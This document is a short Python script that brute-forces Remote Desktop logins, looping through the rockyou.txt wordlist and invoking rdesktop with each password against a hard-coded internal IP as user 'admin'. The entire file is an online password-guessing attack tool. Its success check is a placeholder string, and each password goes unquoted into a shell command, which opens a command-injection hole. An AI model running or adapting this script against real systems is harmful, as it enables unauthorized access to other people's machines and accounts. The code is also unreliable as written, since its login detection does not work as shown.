import subprocess

# Path to the rockyou.txt wordlist
wordlist_path = "/usr/share/wordlists/rockyou.txt"

# Remote server details
server_ip = "10.6.0.250"
username = "admin"

# Open the wordlist file
with open(wordlist_path, 'r', encoding='latin-1') as file:
    passwords = file.readlines()

# Loop through each password in the wordlist
for password in passwords:
    password = password.strip()  # Remove any whitespace/newline characters
    command = f"rdesktop -u {username} -p {password} {server_ip}"
    
    try:
        # Execute the rdesktop command
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
        
        # Check the output for successful login
        if "successful login message" in result.stdout.decode():
            print(f"Success: {password}")
            break
    except subprocess.TimeoutExpired:
        print(f"Timeout expired for password: {password}")
    except Exception as e:
        print(f"An error occurred: {e}")
